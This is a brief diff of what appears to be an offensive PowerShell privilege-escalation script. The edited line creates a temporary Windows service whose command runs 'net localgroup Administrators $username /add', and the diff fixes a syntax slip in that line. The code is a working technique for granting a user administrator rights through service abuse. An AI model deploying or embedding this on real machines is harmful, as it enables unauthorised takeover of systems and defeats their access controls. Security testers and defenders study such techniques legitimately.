@@ -49,7 +49,7 @@ else
     Write-Host -ForegroundColor Green [+] -NoNewline
     Write-Host -ForegroundColor Yellow " Adding Service"
 
-    $createService = New-Service -Name $TempServiceName -BinaryPathName "C:\windows\system32\CMD.exe /K net localgroup Administrators $username /add"-StartupType Manual if (get-service $TempServiceName)
+    $createService = New-Service -Name $TempServiceName -BinaryPathName "C:\windows\system32\CMD.exe /K net localgroup Administrators $username /add"-StartupType Manual
     
     if (get-service $TempServiceName)
     {
